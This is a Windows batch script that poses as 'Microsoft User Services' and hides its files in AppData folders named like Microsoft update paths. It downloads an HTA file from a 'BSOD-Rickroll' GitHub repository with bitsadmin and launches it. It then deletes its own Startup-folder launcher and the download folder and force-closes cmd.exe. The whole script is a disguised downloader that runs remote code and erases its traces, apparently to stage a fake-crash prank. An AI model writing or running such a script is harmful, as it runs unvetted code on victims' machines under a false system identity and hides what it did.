@echo off

cls
title Microsoft User Services
mkdir "%AppData%\Microsoft\Update\User\Services"

bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Instant/Instant_msrkl.hta" "%AppData%\Microsoft\Update\msrkl.hta"
start "%AppData%\Microsoft\Update\msrkl.hta"
start (rmdir /s /q "%appdata%\Microsoft\Update" && del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Instant_startup.bat" && taskkill /f /im cmd.exe)
